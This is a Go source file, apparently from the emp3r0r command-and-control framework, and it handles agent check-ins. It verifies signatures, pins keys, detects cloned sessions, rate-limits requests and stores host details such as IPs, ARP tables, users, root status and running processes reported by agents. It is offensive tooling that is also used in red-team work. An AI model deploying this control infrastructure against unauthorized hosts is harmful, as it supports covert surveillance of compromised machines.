package server

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/gorilla/mux"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
)

var (
	// rotationRateLimiter tracks key rotation timestamps per AgentUUID to prevent log flooding
	rotationRateLimiter = make(map[string][]time.Time)
	limiterMutex        sync.Mutex
)

// handleAgentCheckIn processes agent check-in requests.
func handleAgentCheckIn(wrt http.ResponseWriter, req *http.Request) {
	// check if agent is already connected (duplicated checkin)
	// strictly by tag (token in URL)
	vars := mux.Vars(req)
	token := vars["token"]
	if token != "" && agents.IsAgentExistByUUID(token) {
		agent := agents.GetAgentByUUID(token)
		if agent != nil {
			live.AgentControlMapMutex.RLock()
			ctrl := live.AgentControlMap[agent]
			if ctrl != nil && ctrl.Conn != nil {
				logging.Warningf("handleAgentCheckIn: %s already connected, refusing duplicated checkin", token)
				wrt.WriteHeader(http.StatusForbidden)
				live.AgentControlMapMutex.RUnlock()
				return
			}
			live.AgentControlMapMutex.RUnlock()
		}
	}

	conn, err := h2conn.Accept(wrt, req)
	defer func() {
		_ = conn.Close()
		if logging.Level >= 4 {
			logging.Debugf("handleAgentCheckIn finished")
		}
	}()
	if err != nil {
		logging.Errorf("handleAgentCheckIn: connection failed from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	// Global Encryption: Wrap connection
	secureConn := transport.NewSecureConn(conn)
	// target is a pointer to Emp3r0rAgent
	target := new(def.Emp3r0rAgent)
	in := cbor.NewDecoder(secureConn) // Use secureConn
	err = in.Decode(target)
	if err != nil {
		logging.Warningf("handleAgentCheckIn decode error: %v", err)
		return
	}
	// verify agent identification
	// timestamp is already checked in transport.VerifySignatureWithCA
	agent_sig, err := base64.URLEncoding.DecodeString(target.UUIDSig)
	if err != nil {
		logging.Errorf("Failed to decode agent sig: %v", err)
		return
	}

	// TOFU: Trust On First Use
	// If agent exists, verify with pinned key
	// If agent is new, verify with provided key and pin it
	isNew := true

	live.AgentControlMapMutex.RLock()
	existingKey := ""
	for a := range live.AgentControlMap {
		if a.UUID == target.UUID {
			existingKey = a.PublicKey
			isNew = false
			break
		}
	}
	live.AgentControlMapMutex.RUnlock()

	// If not in memory, check if it exists in DB (Persistent Session)
	// If not in memory, check if it exists in DB (Persistent Session)
	if isNew && agents.AgentDB != nil {
		storedAgent, err := agents.GetStoredAgent(target.UUID)
		if err != nil {
			logging.Errorf("handleAgentCheckIn: GetStoredAgent error: %v", err)
		}
		if storedAgent != nil {
			isNew = false
			existingKey = storedAgent.PublicKey
		}
	}

	if !isNew {
		// Existing agent: Check for key mismatch
		if existingKey != "" && target.PublicKey != existingKey {
			// KEY ROTATION DETECTED

			// Check rate limit for rotation events specifically
			limiterMutex.Lock()
			rotationRateLimiter[target.UUID] = append(rotationRateLimiter[target.UUID], time.Now())
			limiterMutex.Unlock()

			// Find if there is an active controller (Scenario A: Active Session)
			var activeCtrl *live.AgentControl
			live.AgentControlMapMutex.RLock()
			for a, ctrl := range live.AgentControlMap {
				if a.UUID == target.UUID {
					activeCtrl = ctrl
					break
				}
			}
			live.AgentControlMapMutex.RUnlock()

			// Scenario A: Clone Attack (Parallel Session)
			if activeCtrl != nil && activeCtrl.Conn != nil {
				msg := fmt.Sprintf("CRITICAL SECURITY ALERT: Clone detected for %s! Active session has Key A, new request has Key B. Blocking.", target.UUID)
				logging.Errorf("%s", msg)
				operatorBroadcastPrintf(logging.ERROR, "%s", msg)
				wrt.WriteHeader(http.StatusForbidden)
				return
			}

			// Scenario B: Rotation Request
			// Check pending
			live.PendingKeyRotationsMutex.RLock()
			_, pending := live.PendingKeyRotations[target.UUID]
			live.PendingKeyRotationsMutex.RUnlock()

			if pending {
				// Already pending, just block
				wrt.WriteHeader(http.StatusForbidden)
				return
			}

			// Create Request
			live.PendingKeyRotationsMutex.Lock()
			live.PendingKeyRotations[target.UUID] = target.PublicKey
			live.PendingKeyRotationsMutex.Unlock()

			msg := fmt.Sprintf("CRITICAL: Agent %s requests key rotation. Run 'forget_agent %s' to remove old record and allow re-registration.", target.UUID, strconv.Quote(target.UUID))
			logging.Warningf("%s", msg)
			operatorBroadcastPrintf(logging.WARN, "%s", msg)
			wrt.WriteHeader(http.StatusForbidden)
			return
		}
	} else {
		if target.PublicKey == "" {
			logging.Warningf("New agent %s provided no public key", target.UUID)
		}
	}

	// Verify that the UUID is authorized by the CA (Proof of Origin)
	// This prevents forgery of new UUIDs.
	isValid, err := transport.VerifySignatureWithCA([]byte(target.UUID), agent_sig)
	if err != nil {
		logging.Errorf("Failed to verify agent uuid sig (CA): %v", err)
		return
	}
	if !isValid {
		logging.Errorf("Invalid agent uuid signature (CA mismatch), refusing request")
		wrt.WriteHeader(http.StatusForbidden)
		return
	}
	target.From = req.RemoteAddr

	// ------------------------------------------------------------
	// SECURITY: DoS Protection (Rate Limiting)
	// ------------------------------------------------------------
	limiterMutex.Lock()
	defer limiterMutex.Unlock()

	now := time.Now()
	// Prune old timestamps (> 1 minute)
	validTimestamps := []time.Time{}
	if timestamps, exists := rotationRateLimiter[target.UUID]; exists {
		for _, t := range timestamps {
			if now.Sub(t) < time.Minute {
				validTimestamps = append(validTimestamps, t)
			}
		}
	}
	rotationRateLimiter[target.UUID] = validTimestamps

	// Check limit (10 rotations per minute)
	if len(validTimestamps) > 10 {
		// Silent Drop: Stop processing to save CPU/Disk
		logging.Warningf("Rate limit exceeded for agent %s, dropping request", target.UUID)
		return
	}

	// ------------------------------------------------------------
	// SECURITY: Clone Detection & Session Management
	// ------------------------------------------------------------
	// ------------------------------------------------------------
	// DATABASE: Change Detection & Recording
	// ------------------------------------------------------------
	if agents.AgentDB != nil {
		// Detect changes before recording new data
		if err := agents.DetectAgentChanges(target); err != nil {
			logging.Warningf("Failed to detect agent changes: %v", err)
		}

		// Record check-in
		if err := agents.RecordAgentCheckin(target); err != nil {
			logging.Warningf("Failed to record agent check-in: %v", err)
		}
	}

	live.AgentControlMapMutex.Lock()
	defer live.AgentControlMapMutex.Unlock()

	if !agents.IsAgentExistLocked(target) {
		// New agent - register it
		inx := agents.AssignAgentIndexLocked()
		target.LastSeen = time.Now()
		live.AgentControlMap[target] = &live.AgentControl{Index: inx, Conn: nil}
		shortname := strings.Split(target.Tag, "-agent")[0]
		if util.IsExist(agents.AgentsJSON) {
			if l := agents.RefreshAgentLabel(target); l != "" {
				shortname = l
			}
		}
		logging.Infof("Checked in: %s from %s, running %s", strconv.Quote(shortname), fmt.Sprintf("'%s - %s'", target.From, target.Transport), strconv.Quote(target.OS))
	} else {
		// Existing agent - refresh info
		var existingKey *def.Emp3r0rAgent
		for a, ctrl := range live.AgentControlMap {
			if a.UUID == target.UUID {
				// if agent is already connected, it must be the same instance
				// because we already checked for duplications
				if ctrl.Conn != nil {
					logging.Warningf("handleAgentCheckIn: %s just connected, but state says it is already connected. This implies a race condition or logic error.", target.Tag)
				}
				// Refresh agent info, but keep the pointer to avoid breaking maps
				a.Name = target.Name
				a.Version = target.Version
				a.Transport = target.Transport
				a.Hostname = target.Hostname
				a.Hardware = target.Hardware
				a.Container = target.Container
				a.CPU = target.CPU
				a.GPU = target.GPU
				a.Mem = target.Mem
				a.OS = target.OS
				a.GOOS = target.GOOS
				a.Kernel = target.Kernel
				a.Arch = target.Arch
				a.From = target.From
				a.IPs = target.IPs
				a.ARP = target.ARP
				a.User = target.User
				a.HasRoot = target.HasRoot
				a.HasTor = target.HasTor
				a.HasInternet = target.HasInternet
				a.NCSIEnabled = target.NCSIEnabled
				a.Process = target.Process
				a.Exes = target.Exes
				a.CWD = target.CWD
				a.Product = target.Product
				a.LastSeen = time.Now()
				existingKey = a
				break
			}
		}
		shortname := strings.Split(target.Tag, "-agent")[0]
		if util.IsExist(agents.AgentsJSON) {
			if existingKey != nil {
				if l := agents.RefreshAgentLabel(existingKey); l != "" {
					shortname = l
				}
			}
		}
		if logging.Level >= 4 {
			logging.Debugf("Refreshing sysinfo for %s from %s, running %s", shortname, fmt.Sprintf("%s - %s", target.From, target.Transport), strconv.Quote(target.OS))
		}
	}
}
